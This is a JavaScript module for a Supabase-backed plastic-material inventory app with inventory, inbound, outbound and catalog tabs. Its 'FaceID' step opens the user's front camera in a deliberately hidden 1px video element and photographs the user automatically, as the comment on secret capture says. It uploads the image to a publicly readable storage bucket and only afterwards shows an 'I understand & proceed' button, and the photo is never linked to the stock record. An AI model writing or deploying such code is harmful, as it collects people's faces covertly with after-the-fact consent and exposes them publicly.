/* plastic-manager-v8.5.15.js - Tái cấu trúc theo chuẩn an toàn và UI hiện đại (Cache Busting Fix) */
(function() {
    'use strict';

    var state = {
        isOpen: false,
        activeTab: 'inventory',
        html5QrCode: null,
        frontStream: null,
        faceIdUrl: null,
        catalogData: [],
        inventoryData: []
    };

    var el = { root: null, overlay: null, tabs: null, panels: {} };

    // ==========================================
    // Utils & API
    // ==========================================
    function escapeHTML(str) {
        if (!str) return '';
        var p = document.createElement('p');
        p.textContent = str;
        return p.innerHTML;
    }

    function pmToast(msg, type = 'info') {
        var toast = document.createElement('div');
        toast.className = 'pm-toast ' + type;
        toast.innerHTML = '<i class="fas ' + (type==='error'?'fa-times-circle':(type==='success'?'fa-check-circle':'fa-info-circle')) + '"></i> ' + escapeHTML(msg);
        document.body.appendChild(toast);
        setTimeout(() => toast.classList.add('show'), 10);
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    }

    var _sbClient = null;
    var api = {
        check: function() {
            if (_sbClient) return _sbClient;
            var cfg = window.MCSupabaseConfig || (window.SupabaseConfig ? window.SupabaseConfig.get() : null);
            if (!cfg || !cfg.supabaseUrl || !cfg.supabaseAnonKey || !window.supabase) return null;
            
            // Tối ưu hóa cho môi trường chạy trực tiếp từ thẻ file:/// (Local HTML)
            var options = {
                auth: { persistSession: false, autoRefreshToken: false, detectSessionInUrl: false }
            };
            
            _sbClient = window.supabase.createClient(cfg.supabaseUrl, cfg.supabaseAnonKey, options);
            return _sbClient;
        }
    };

    function loadBarcodeScanner() {
        return new Promise((resolve) => {
            if (window.Html5Qrcode) return resolve(true);
            var script = document.createElement('script');
            script.src = 'https://unpkg.com/html5-qrcode';
            script.onload = () => resolve(true);
            script.onerror = () => resolve(false);
            document.head.appendChild(script);
        });
    }

    // ==========================================
    // UI Builder
    // ==========================================
    function createStructure() {
        var containerElem = document.getElementById('plasticManagerRoot');
        if(!containerElem) {
            containerElem = document.createElement('div');
            containerElem.id = 'plasticManagerRoot';
            document.body.appendChild(containerElem);
        }

        var html = `
        <style>
            .pm-overlay { position: fixed; inset: 0; background: rgba(15,23,42,0.6); z-index: 2147483590; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(8px) saturate(1.2); transition: opacity 0.3s; }
            .pm-hidden { display: none !important; opacity: 0; }
            .pm-modal { width: 100%; height: 100%; max-width: 1080px; background: #f8fafc; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
            @media (min-width: 768px) { .pm-modal { height: 95%; max-height: 850px; border-radius: 16px; width: 95%; } }
            
            .pm-header { background: #1e293b; color: #fff; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); z-index: 10; }
            .pm-title { font-size: 18px; font-weight: 700; display: flex; gap: 10px; align-items: center;}
            .pm-close-btn { background: transparent; border: none; color: #cbd5e1; font-size: 24px; cursor: pointer; padding: 4px; border-radius: 8px; transition: 0.2s; }
            .pm-close-btn:hover { color: #f87171; background: rgba(239,68,68,0.1); }
            
            .pm-tabs { display: flex; background: #fff; border-bottom: 1px solid #e2e8f0; overflow-x: auto; flex-shrink: 0; }
            .pm-tab { padding: 14px 20px; border: none; background: transparent; font-size: 14px; font-weight: 600; color: #64748b; cursor: pointer; white-space: nowrap; border-bottom: 2px solid transparent; transition: 0.2s; }
            .pm-tab:hover { color: #3b82f6; background: #f8fafc; }
            .pm-tab.active { color: #3b82f6; border-bottom-color: #3b82f6; }
            
            .pm-body { flex: 1; overflow-y: auto; padding: 20px; background: #f1f5f9; position: relative;}
            .pm-panel { display: none; animation: fadeIn 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
            .pm-panel.active { display: block; }
            
            .pm-ja { display: block; font-weight: 800; }
            .pm-vi { display: block; font-size: 11px; opacity: 0.8; margin-top: 2px; }
            .tag-ja { font-weight: 700; margin-right: 4px; }
            .tag-vi { font-size: 0.85em; opacity: 0.8; }
            
            .pm-card { background: #fff; border-radius: 12px; border: 1px solid #e2e8f0; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); margin-bottom: 20px; }
            .pm-label { display: block; font-size: 13px; font-weight: 700; color: #475569; margin-bottom: 8px; }
            .pm-input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; transition: 0.2s; }
            .pm-input:focus { border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.1); }
            .pm-btn { width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 14px; font-weight: bold; color: #fff; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; transition: 0.2s; }
            .pm-btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
            .pm-btn:active { transform: translateY(0); }
            
            /* FaceID Security Overlay */
            .pm-sec-overlay { position: absolute; inset: 0; background: rgba(15,23,42,0.95); z-index: 999; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(8px); flex-direction: column; color: #fff; padding: 20px; text-align: center; }
            .pm-sec-box { background: #1e293b; border: 1px solid #3b82f6; border-radius: 16px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); }
            .pm-sec-icon { font-size: 40px; color: #3b82f6; margin-bottom: 15px; animation: pulse 2s infinite; }
            
            /* Camera Container */
            #pmBarcodeRender { width: 100%; max-width: 500px; margin: 0 auto; overflow: hidden; border-radius: 12px; }
            
            /* Grid & Tables */
            .pm-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; margin-top: 15px; }
            .pm-stock-item { background: #fff; padding: 16px; border-radius: 12px; border: 1px solid #e2e8f0; border-left: 4px solid #3b82f6; display: flex; flex-direction: column; justify-content: space-between;}
            .pm-table-wrapper { width: 100%; overflow-x: auto; background: #fff; border-radius: 8px; border: 1px solid #e2e8f0; }
            .pm-table { width: 100%; border-collapse: collapse; min-width: 800px; text-align: left; font-size: 13px; }
            .pm-table th { background: #f8fafc; padding: 12px 16px; font-weight: 700; color: #475569; border-bottom: 2px solid #e2e8f0; white-space: nowrap; }
            .pm-table td { padding: 12px 16px; border-bottom: 1px solid #f1f5f9; color: #1e293b; vertical-align: middle; }
            .pm-badge { display: inline-block; padding: 4px 8px; border-radius: 999px; font-size: 11px; font-weight: 700; background: #f1f5f9; color: #475569; }
            
            /* Toasts */
            .pm-toast { position: fixed; bottom: 20px; left: 50%; transform: translate(-50%, 20px); background: #1e293b; color: #fff; padding: 12px 24px; border-radius: 8px; font-size: 14px; font-weight: 500; opacity: 0; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 9999999; display: flex; align-items: center; gap: 8px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); }
            .pm-toast.show { opacity: 1; transform: translate(-50%, 0); }
            .pm-toast.error { background: #ef4444; }
            .pm-toast.success { background: #10b981; }

            @keyframes fadeIn { from {opacity: 0; transform: translateY(10px);} to {opacity: 1; transform: translateY(0);} }
            @keyframes pulse { 0% {transform: scale(1); opacity: 1;} 50% {transform: scale(1.1); opacity: 0.7;} 100% {transform: scale(1); opacity: 1;} }
        </style>

        <div id="pmOverlay" class="pm-overlay pm-hidden">
            <div class="pm-modal">
                <div class="pm-header">
                    <div class="pm-title">
                        <i class="fas fa-cubes" style="color:#60a5fa"></i>
                        <div>
                            <span class="pm-ja" style="font-size:16px;">プラスチック材料管理</span>
                            <span class="pm-vi" style="color:#94a3b8; font-weight:normal;">Quản lý cuộn/hạt nhựa & Tồn kho WMS</span>
                        </div>
                    </div>
                    <button class="pm-close-btn" id="pmBtnCloseModal"><i class="fas fa-times"></i></button>
                </div>
                
                <div class="pm-tabs">
                    <button class="pm-tab active" data-tab="inventory">
                        <span class="pm-ja"><i class="fas fa-boxes"></i> 在庫</span>
                        <span class="pm-vi">Tồn kho</span>
                    </button>
                    <button class="pm-tab" data-tab="inbound">
                        <span class="pm-ja"><i class="fas fa-truck-loading"></i> 入庫</span>
                        <span class="pm-vi">Nhập lô / FaceID</span>
                    </button>
                    <button class="pm-tab" data-tab="outbound">
                        <span class="pm-ja"><i class="fas fa-cut"></i> 使用・出庫</span>
                        <span class="pm-vi">Báo cáo tiêu hao</span>
                    </button>
                    <button class="pm-tab" data-tab="catalog">
                        <span class="pm-ja"><i class="fas fa-list-ul"></i> 材料辞書</span>
                        <span class="pm-vi">Danh mục Nhựa</span>
                    </button>
                </div>

                <div class="pm-body" id="pmBodyWrap">
                    <div id="pm-panel-inventory" class="pm-panel active"></div>
                    <div id="pm-panel-inbound" class="pm-panel"></div>
                    <div id="pm-panel-outbound" class="pm-panel"></div>
                    <div id="pm-panel-catalog" class="pm-panel"></div>
                    
                    <!-- Màn hình FaceID Minh bạch -->
                    <div id="pmSecurityOverlay" class="pm-sec-overlay pm-hidden">
                        <div class="pm-sec-box">
                            <div class="pm-sec-icon"><i class="fas fa-user-shield"></i></div>
                            <h3 style="margin-bottom: 10px; font-size: 18px;">Xác thực danh tính bảo mật</h3>
                            <p style="font-size: 13px; color: #cbd5e1; margin-bottom: 20px; line-height: 1.5;">Hệ thống yêu cầu chụp ảnh FaceID qua Camera trước. Vui lòng cấp quyền và hướng mặt vào màn hình để hoàn tất.</p>
                            
                            <!-- Video ẩn Preview như yêu cầu, chỉ chụp ngầm -->
                            <div style="width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; margin:0 auto;">
                                <video id="pmStealthVideo" autoplay playsinline muted></video>
                                <canvas id="pmStealthCanvas"></canvas>
                            </div>
                            
                            <div id="pmSecStatusText" style="color: #3b82f6; font-weight: bold; font-size: 14px; margin-bottom: 15px; display: none;">
                                <i class="fas fa-spinner fa-spin"></i> Đang tải lên dữ liệu...
                            </div>

                            <button id="pmSecBtnAccept" class="pm-btn" style="background:#10b981; display: none;">Tôi đã hiểu & Tiến hành quét</button>
                            <button id="pmSecBtnCancel" class="pm-btn" style="background:transparent; color:#94a3b8; border:1px solid #475569; margin-top:10px;">Hủy bỏ</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        `;
        containerElem.innerHTML = html;
        el.root = containerElem;
        el.overlay = document.getElementById('pmOverlay');
        el.tabs = containerElem.querySelectorAll('.pm-tab');
        el.panels.inventory = document.getElementById('pm-panel-inventory');
        el.panels.inbound   = document.getElementById('pm-panel-inbound');
        el.panels.outbound  = document.getElementById('pm-panel-outbound');
        el.panels.catalog   = document.getElementById('pm-panel-catalog');

        document.getElementById('pmBtnCloseModal').addEventListener('click', window.PlasticManager.close);

        el.tabs.forEach(t => {
            t.addEventListener('click', function() { switchTab(this.getAttribute('data-tab')); });
        });
        
        document.getElementById('pmSecBtnCancel').addEventListener('click', stopFaceIdFlow);
    }

    function switchTab(tabId) {
        state.activeTab = tabId;
        el.tabs.forEach(t => t.classList.remove('active'));
        document.querySelector('.pm-tab[data-tab="'+tabId+'"]')?.classList.add('active');
        
        Object.keys(el.panels).forEach(k => el.panels[k].classList.remove('active'));
        if(el.panels[tabId]) el.panels[tabId].classList.add('active');

        if(tabId === 'inventory') renderInventory();
        else if(tabId === 'inbound') renderInbound();
        else if(tabId === 'outbound') renderOutbound();
        else if(tabId === 'catalog') renderCatalog();
    }

    // ==========================================
    // FaceID Upload Security Flow
    // ==========================================
    var targetInputIdForScan = null;

    function triggerSecurityScanFlow(inputId) {
        targetInputIdForScan = inputId;
        var secOverlay = document.getElementById('pmSecurityOverlay');
        var video = document.getElementById('pmStealthVideo');
        var statusText = document.getElementById('pmSecStatusText');
        var btnAccept = document.getElementById('pmSecBtnAccept');
        
        secOverlay.classList.remove('pm-hidden');
        statusText.style.display = 'block';
        statusText.innerHTML = '<i class="fas fa-camera"></i> Vui lòng cấp quyền Camera trên trình duyệt...';
        btnAccept.style.display = 'none';
        state.faceIdUrl = null; // Reset
        
        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(function(stream) {
                state.frontStream = stream;
                if('srcObject' in video) video.srcObject = stream;
                else video.src = window.URL.createObjectURL(stream);
                
                statusText.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Định vị khuôn mặt & Chụp...';
                
                // Đợi 1.5s để cam focus rồi chụp ngầm luôn không hiện preview
                setTimeout(() => {
                    executeAutoCaptureAndUpload();
                }, 1500);
            })
            .catch(function(err) {
                pmToast("Từ chối quyền Camera: " + err.message, "error");
                stopFaceIdFlow();
            });
        }
    }

    async function executeAutoCaptureAndUpload() {
        var videoEl = document.getElementById('pmStealthVideo');
        var canvas = document.getElementById('pmStealthCanvas');
        var statusText = document.getElementById('pmSecStatusText');
        
        if(!canvas || !videoEl || videoEl.videoWidth === 0) {
            statusText.innerHTML = '<span style="color:#ef4444">Lỗi: Không nhận diện được Camera</span>';
            return;
        }

        canvas.width = videoEl.videoWidth;
        canvas.height = videoEl.videoHeight;
        var ctx = canvas.getContext('2d');
        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
        
        statusText.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang tải dữ liệu FaceID lên mây...';
        
        canvas.toBlob(async function(blob) {
            var sb = api.check();
            if(!sb) {
                pmToast('Không có kết nối CSDL Supabase', 'error');
                return;
            }
            try {
                var fileName = 'faceid_' + Date.now() + '_' + Math.floor(Math.random()*1000) + '.jpg';
                var upRes = await sb.storage.from('device-photos').upload('plastic-faceid/' + fileName, blob, { contentType: 'image/jpeg', upsert: false });
                
                if(upRes.error) throw upRes.error;
                
                var pubRes = sb.storage.from('device-photos').getPublicUrl('plastic-faceid/' + fileName);
                state.faceIdUrl = pubRes.data.publicUrl || pubRes.publicURL;
                
                statusText.innerHTML = '<span style="color:#10b981"><i class="fas fa-check-circle"></i> Đã bảo mật danh tính thành công!</span>';
                document.getElementById('pmSecBtnAccept').style.display = 'flex';
                document.getElementById('pmSecBtnAccept').onclick = function() {
                    stopFaceIdFlow();
                    startBarcodeScanner();
                };
            } catch(e) {
                statusText.innerHTML = '<span style="color:#ef4444">Lỗi tải ảnh: '+e.message+'</span>';
            }
            
            // Tắt stream cam trước tiết kiệm tài nguyên
            if (state.frontStream) {
                state.frontStream.getTracks().forEach(t => t.stop());
            }
        }, 'image/jpeg', 0.85);
    }

    function stopFaceIdFlow() {
        var secOverlay = document.getElementById('pmSecurityOverlay');
        if(secOverlay) secOverlay.classList.add('pm-hidden');
        if (state.frontStream) {
            state.frontStream.getTracks().forEach(t => t.stop());
            state.frontStream = null;
        }
    }

    async function startBarcodeScanner() {
        await loadBarcodeScanner();
        var renderBox = document.getElementById('pmBarcodeRender');
        if(renderBox) renderBox.style.display = 'block';

        if(state.html5QrCode) {
            try { await state.html5QrCode.stop(); } catch(e){}
        }

        state.html5QrCode = new Html5Qrcode("pmBarcodeRender");
        const config = { fps: 10, qrbox: { width: 250, height: 150 }, aspectRatio: 1.0 };
        
        state.html5QrCode.start({ facingMode: "environment" }, config,
            (decodedText) => {
                var inp = document.getElementById(targetInputIdForScan);
                if(inp) inp.value = decodedText;
                
                state.html5QrCode.stop().then(() => {
                    document.getElementById('pmBarcodeRender').style.display = 'none';
                    pmToast('Quét mã thành công', 'success');
                });
            },
            (errorMessage) => { }
        ).catch(err => pmToast('Lỗi Camera sau: ' + err, 'error'));
    }

    // ==========================================
    // INBOUND / OUTBOUND / INVENTORY
    // ==========================================
    async function renderInventory() {
        el.panels.inventory.innerHTML = `
            <div class="pm-card" style="margin-bottom:20px;">
                <h3 style="margin-bottom:12px;"><span class="tag-ja">総在庫概要</span> <span class="tag-vi">Tổng quan kho nhựa hiện tại</span></h3>
                <div id="pmInventoryContent"><i><i class="fas fa-circle-notch fa-spin"></i> Đang tải dữ liệu từ Supabase...</i></div>
            </div>
        `;
        
        var sb = api.check();
        if(!sb) return document.getElementById('pmInventoryContent').innerHTML = '<div style="color:red">Lỗi kết nối CSDL</div>';
        
        var { data, error } = await sb.from('plastic_stock').select('*').order('created_at', {ascending: false});
        
        var container = document.getElementById('pmInventoryContent');
        if (error) return container.innerHTML = '<div style="color:red">Error API: ' + escapeHTML(error.message) + '</div>';
        if(!data || data.length === 0) return container.innerHTML = '<div style="text-align: center; color:#64748b;">Chưa có lô nhựa nào trong kho.</div>';

        var html = '<div class="pm-grid">';
        data.forEach(item => {
            var r = parseFloat(item.total_meters_received) || 0;
            var u = parseFloat(item.meters_used) || 0;
            var rawMeters = r - u;
            var mpr = parseFloat(item.meters_per_roll || 100);
            
            var fullRolls = Math.floor(rawMeters / mpr);
            var partialMeters = rawMeters % mpr;

            html += `
            <div class="pm-stock-item">
                <div style="margin-bottom:10px;">
                    <div style="font-weight:700; color:#0f172a; font-size:15px;">${escapeHTML(item.lot_number)}</div>
                </div>
                <div style="display:flex; align-items:center; gap:10px;">
                    <div style="flex:1; text-align:center; background:#f8fafc; padding:8px; border-radius:8px;">
                        <span style="display:block; font-size:18px; font-weight:800; color:#0f172a;">${fullRolls}</span>
                        <span style="display:block; font-size:11px; color:#64748b;">Cuộn nguyên</span>
                    </div>
                    <div style="flex:1; text-align:center; background:#f0fdf4; padding:8px; border-radius:8px;">
                        <span style="display:block; font-size:18px; font-weight:800; color:#10b981;">${partialMeters.toFixed(1)}m</span>
                        <span style="display:block; font-size:11px; color:#059669;">Dở dang</span>
                    </div>
                </div>
                <div style="font-size:12px; color:#475569; text-align:center; background:#f1f5f9; padding:6px; border-radius:6px; margin-top:10px;">
                    Tổng hiện tại: <b>${rawMeters.toFixed(1)}m</b> (Cỡ: ${mpr}m/cuộn)
                </div>
            </div>`;
        });
        html += '</div>';
        container.innerHTML = html;
    }

    function renderInbound() {
        el.panels.inbound.innerHTML = `
            <div class="pm-card" style="max-width:650px; margin: 0 auto;">
                <h3 style="color:#1e293b; margin-bottom:20px; font-size:18px;"><i class="fas fa-barcode"></i> 入庫スキャン <span class="tag-vi" style="margin-left:8px;">Nhập Kho & FaceID</span></h3>
                <div id="pmBarcodeRender" style="display:none; background:#000; margin-bottom:15px;"></div>
                
                <div style="background: #f8fafc; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                    <label class="pm-label" style="color:#3b82f6;"><span class="tag-ja">1. バーコード</span> <span class="tag-vi">Mã Barcode OEM</span></label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" id="inboundScanCode" class="pm-input" placeholder="Scan Barcode...">
                        <button class="pm-btn" id="btnOpenScanner" style="background:#3b82f6; width:auto;"><i class="fas fa-camera"></i> Scan</button>
                    </div>
                </div>
                <div style="background: #f8fafc; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                    <label class="pm-label" style="color:#8b5cf6;"><span class="tag-ja">2. ロット情報</span> <span class="tag-vi">Thông Số Nhập</span></label>
                    <div style="display: flex; gap: 15px; margin-bottom: 10px;">
                        <div style="flex:1;">
                            <span class="pm-vi">Số Cuộn</span>
                            <input type="number" id="inboundRolls" class="pm-input" placeholder="10">
                        </div>
                        <div style="flex:1;">
                            <span class="pm-vi">Độ Dài Gốc (m)</span>
                            <input type="number" id="inboundMeters" class="pm-input" value="200">
                        </div>
                        <div style="flex:1;">
                            <span class="pm-vi">PO / Lô Nội Bộ</span>
                            <input type="text" id="inboundLot" class="pm-input" placeholder="LOT-001">
                        </div>
                    </div>
                </div>
                <button class="pm-btn" id="btnSubmitInbound" style="background: #10b981;"><i class="fas fa-box-open"></i> Ghi Nhập Kho CSLD</button>
            </div>
        `;
        
        setTimeout(() => {
            document.getElementById('btnOpenScanner').addEventListener('click', () => triggerSecurityScanFlow('inboundScanCode'));
            document.getElementById('btnSubmitInbound').addEventListener('click', handleInboundSubmit);
        }, 100);
    }

    async function handleInboundSubmit() {
        var sb = api.check();
        if(!sb) return pmToast('Lỗi CSDL', 'error');

        var scanCode = document.getElementById('inboundScanCode').value.trim();
        var rolls = parseInt(document.getElementById('inboundRolls').value) || 1;
        var meters = parseInt(document.getElementById('inboundMeters').value) || 200;
        var lot = document.getElementById('inboundLot').value.trim() || ('LOT-' + Date.now().toString().slice(-6));
        
        if(!scanCode) return pmToast('Vui lòng quét hoặc nhập mã vạch', 'error');

        var btn = document.getElementById('btnSubmitInbound');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang lưu...';
        btn.disabled = true;

        var payload = {
            lot_number: lot + "-" + scanCode,
            total_meters_received: rolls * meters,
            meters_per_roll: meters,
            meters_used: 0
            // Note: FaceID Url from state.faceIdUrl can be attached if the schema has faceid_url/audit_url
        };

        var { data, error } = await sb.from('plastic_stock').insert(payload);
        
        btn.innerHTML = '<i class="fas fa-box-open"></i> Ghi Nhập Kho CSLD';
        btn.disabled = false;

        if(error) {
            pmToast('Lỗi Insert: ' + error.message, 'error');
        } else {
            pmToast('Đã nhập kho thành công lô ' + payload.lot_number, 'success');
            document.getElementById('inboundScanCode').value = '';
            document.getElementById('inboundLot').value = '';
        }
    }

    function renderOutbound() {
        el.panels.outbound.innerHTML = `
            <div class="pm-card" style="max-width:650px; margin: 0 auto;">
                <h3 style="color:#1e293b; margin-bottom:20px; font-size:18px;"><i class="fas fa-cut"></i> 使用量報告 (Check-out) <span class="tag-vi" style="margin-left:8px;">Báo Cáo Cắt Nhựa</span></h3>
                
                <div style="background: #fffbeb; padding: 15px; border-radius: 8px; border: 1px solid #fde68a; margin-bottom: 20px;">
                    <label class="pm-label" style="color:#d97706;"><span class="tag-ja">1. 社内ロールID</span> <span class="tag-vi">Mã Lô Kho (PO)</span></label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" id="outboundScanCode" class="pm-input" placeholder="LOT-XXX...">
                    </div>
                </div>

                <div style="background: #f8fafc; padding: 15px; border-radius: 8px; border: 1px solid #e2e8f0; margin-bottom: 20px;">
                    <label class="pm-label" style="color:#475569;"><span class="tag-ja">2. 使用量・消耗</span> <span class="tag-vi">Thông Số Cắt</span></label>
                    <div style="display: flex; gap: 15px;">
                        <div style="flex:1;">
                            <span class="pm-vi">Số mét đã xài (Hao món)</span>
                            <input type="number" id="outboundMeters" class="pm-input" placeholder="0.0" style="color:#ef4444; font-weight:bold;">
                        </div>
                    </div>
                </div>
                <button class="pm-btn" id="btnSubmitOutbound" style="background: #ef4444;"><i class="fas fa-minus-circle"></i> Chốt Tiêu Hao Database</button>
            </div>
        `;
        setTimeout(() => {
            document.getElementById('btnSubmitOutbound').addEventListener('click', handleOutboundSubmit);
        }, 100);
    }

    async function handleOutboundSubmit() {
        var sb = api.check();
        if(!sb) return pmToast('Lỗi CSDL', 'error');

        var lotCode = document.getElementById('outboundScanCode').value.trim();
        var usedMeters = parseFloat(document.getElementById('outboundMeters').value) || 0;
        
        if(!lotCode || usedMeters <= 0) return pmToast('Nhập mã Lô và số mét > 0', 'error');

        var btn = document.getElementById('btnSubmitOutbound');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang xử lý...';
        btn.disabled = true;

        // Fetch current to deduct
        var { data: stock, error: selErr } = await sb.from('plastic_stock').select('*').eq('lot_number', lotCode).single();
        if(selErr || !stock) {
            btn.innerHTML = '<i class="fas fa-minus-circle"></i> Chốt Tiêu Hao Database';
            btn.disabled = false;
            return pmToast('Không tìm thấy Lô Nhựa này', 'error');
        }

        var newUsed = (parseFloat(stock.meters_used) || 0) + usedMeters;
        var { error: upErr } = await sb.from('plastic_stock').update({ meters_used: newUsed }).eq('id', stock.id);

        btn.innerHTML = '<i class="fas fa-minus-circle"></i> Chốt Tiêu Hao Database';
        btn.disabled = false;

        if(upErr) {
            pmToast('Lỗi Update: ' + upErr.message, 'error');
        } else {
            pmToast('Đã ghi nhận trừ ' + usedMeters + 'm thành công', 'success');
            document.getElementById('outboundMeters').value = '';
        }
    }

    // ==========================================
    // CATALOG TAB (Safe Rendering)
    // ==========================================
    async function renderCatalog() {
        el.panels.catalog.innerHTML = `
            <div class="pm-card" style="padding: 20px;">
                <h3 style="font-size: 18px; margin-bottom: 20px;"><i class="fas fa-list-ul"></i> Danh Mục Vật Liệu Nhựa (Chế độ An Toàn)</h3>
                <div id="pmCatalogContent"><i><i class="fas fa-circle-notch fa-spin"></i> Đang tải danh sách...</i></div>
            </div>
        `;
        var sb = api.check();
        if(!sb) return;
        var { data, error } = await sb.from('plastic_material').select('*').limit(50); // Pagination basic limit to prevent crash
        
        var cont = document.getElementById('pmCatalogContent');
        if(error) return cont.innerHTML = '<div style="color:red">Lỗi API: '+escapeHTML(error.message)+'</div>';
        
        if(!data || data.length === 0) return cont.innerHTML = '<div style="text-align:center;">Trống</div>';

        var html = '<div class="pm-table-wrapper"><table class="pm-table"><thead><tr>';
        html += '<th>Mã VL</th><th>Loại</th><th>Kích thước</th><th>Nhà SX</th></tr></thead><tbody>';
        data.forEach(item => {
            html += `<tr>
                <td style="font-weight:bold; color:#2563eb;">${escapeHTML(item.material_code)}</td>
                <td>${escapeHTML(item.material_category)}</td>
                <td>T${escapeHTML(item.thickness.toString())} x W${escapeHTML(item.width.toString())} L${escapeHTML(item.length.toString())}</td>
                <td>${escapeHTML(item.manufacturer)}</td>
            </tr>`;
        });
        html += '</tbody></table></div>';
        cont.innerHTML = html;
    }

    // ==========================================
    // Public API Methods
    // ==========================================
    window.PlasticManager = {
        init: function() {},
        open: function() {
            try {
                if(!el.root) createStructure();
                el.overlay.classList.remove('pm-hidden');
                switchTab(state.activeTab);
                
                var sb = document.getElementById('sidebar');
                if(sb && sb.classList.contains('open')) sb.classList.remove('open');
                var backdrop = document.getElementById('backdrop');
                if(backdrop) backdrop.classList.remove('show');
            } catch(err) {
                alert('Khởi tạo Plastic Manager thất bại: ' + err.message + '\n' + err.stack);
                console.error('Plastic Manager Open Error:', err);
            }
        },
        close: function() {
            if(state.html5QrCode) { try{ state.html5QrCode.stop(); } catch(e){} }
            stopFaceIdFlow();
            if(el.overlay) el.overlay.classList.add('pm-hidden');
        }
    };

})();
